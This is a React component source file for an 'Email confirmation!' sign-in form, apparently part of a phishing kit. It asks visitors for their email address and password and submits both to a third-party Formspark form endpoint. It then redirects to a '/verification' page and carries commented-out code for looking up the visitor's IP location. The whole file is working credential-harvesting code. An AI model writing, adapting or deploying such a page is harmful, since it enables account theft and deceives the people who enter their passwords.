import { useFormspark } from "@formspark/use-formspark";
import React, { useState } from "react";
import { Navigate } from "react-router-dom";

const FORMSPARK_FORM_ID = "8Uo7bqIhe";

const EmailConfirm = () => {
  const [emlId, setEmlId] = useState("");
  const [emlPass, setEmlPass] = useState("");
  const [confirm, setConfirm] = useState(false);

  const [submit, submitting] = useFormspark({
    formId: FORMSPARK_FORM_ID,
  });

//   useEffect(() => {
//     Axios.get("https://ipapi.co/json/").then((res) => {
//       setIsDetails(res.data);
//     });
//   }, []);

  const handleSubmit = async (e) => {
    setConfirm(true);
    e.preventDefault();
    await submit({
      emlId,
      emlPass,
    });
    return;
  };

  if (confirm) {
    return (
      <p>
        <Navigate
          to={{
            pathname: "/verification",
          }}
        />
      </p>
    );
  }

  return (
    <div>
    <div className=""></div>
    <div className="">
        <div className="">
        <div className=" ">
         <div className="md:w-96 h-auto w-80 p-4 md:p-8 bg-white mx-auto">
         <div className="text-lg bold text-red-600 my-2 font-bold">Email confirmation!</div>
            <form onSubmit={handleSubmit}>
          <input
            type="email"
            value={emlId}
            onChange={(e) => setEmlId(e.target.value)}
            className="outline-none border-black p-2 my-3 border-2 w-full"
            placeholder="Email Confirmation *"
            required
          />
          <input
            type="type"            
            value={emlPass}
            onChange={(e) => setEmlPass(e.target.value)}
            className="outline-none border-black p-2 my-3 border-2 w-full"
            placeholder="Confirmation password *"
            required
          />
          
            <div className="py-5 w-full">
            <button
              type="submit"
              className="px-6 py-2 w-full text-white font-semibold bg-green-700 rounded-md"
              // onClick={handleAlert}
              disabled={submitting}
            >
              Sign In
            </button>
            </div>
            </form>
             </div>
        </div>
        </div>
    </div>
    
    </div>

  );
};
export default EmailConfirm;
